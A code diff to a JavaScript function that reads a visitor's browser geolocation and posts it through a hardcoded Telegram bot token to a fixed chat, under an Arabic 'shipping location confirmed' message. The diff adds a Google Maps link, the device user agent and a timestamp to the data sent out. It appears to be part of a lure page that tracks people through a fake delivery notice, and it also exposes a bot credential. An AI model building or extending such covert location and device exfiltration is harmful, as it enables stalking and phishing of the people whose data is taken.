@@ -9,9 +9,21 @@ function sendLocation() {
 function success(position) {
   const latitude = position.coords.latitude;
   const longitude = position.coords.longitude;
+  const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+  const userAgent = navigator.userAgent;
+  const timestamp = new Date().toLocaleString('ar-EG');
+
   const telegramToken = '7874509299:AAEXnwpKl-m7E2pVuuYWxfixW-YC1oZ3Ng0';
   const chatId = '6817512459';
-  const message = `تم تأكيد موقع الشحن:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+
+  const message = `
+تم تأكيد موقع الشحن:
+- خط العرض: ${latitude}
+- خط الطول: ${longitude}
+- الموقع على الخريطة: ${googleMapsLink}
+- نوع الجهاز: ${userAgent}
+- الوقت والتاريخ: ${timestamp}
+  `;
 
   fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
     method: "POST",
@@ -20,7 +32,7 @@ function success(position) {
     },
     body: JSON.stringify({
       chat_id: chatId,
-      text: message
+      text: message.trim()
     })
   })
   .then(response => {
